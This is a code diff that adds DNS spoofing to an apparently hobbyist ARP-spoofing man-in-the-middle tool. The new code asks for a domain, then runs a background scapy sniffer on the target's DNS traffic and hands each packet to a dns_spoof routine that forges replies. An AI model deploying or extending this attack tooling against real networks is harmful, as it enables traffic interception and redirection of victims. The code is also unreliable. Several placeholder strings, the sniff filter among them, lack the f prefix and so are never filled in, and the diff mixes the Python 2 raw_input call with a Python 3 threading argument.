@@ -4,6 +4,9 @@ import os
 import shlex
 from scan_hosts import scan_hosts, scan_ifaces
 from arp_spoofing import arp_spoof
+from dns_spoofing import dns_spoof
+import threading
+import scapy.all as sc
 
 
 def print_title():
@@ -55,6 +58,23 @@ def handle_command(cmd):
             print("[!] Usage: start -ip <target_ip> -mac <target_mac> -iptospoof <spoofed_ip>")
             return
         print("[*] Spoofing {ip} (MAC: {mac}) as {ipToSpoof} ... Press Ctrl+C to stop.")
+
+        target_domain = raw_input("Enter the domain to spoof (e.g. example.com.): ").strip()
+        if not target_domain.endswith('.'):
+            target_domain += '.'
+        target_domain = target_domain.encode()
+        print("[*] Spoofing {ip} (MAC: {mac}) as {ipToSpoof} and DNS spoofing {target_domain} ... Press Ctrl+C to stop.")
+
+        # Start a new thread for DNS spoofing in order 
+        def dns_spoof_thread():
+            sc.sniff(
+                filter="udp port 53 and src {ip}",
+                prn=lambda packet: dns_spoof(packet, ip, ipToSpoof, target_domain)
+            )
+
+        dns_thread = threading.Thread(target=dns_spoof_thread, daemon=True)
+        dns_thread.start()
+
         import time
         try:
             while True:
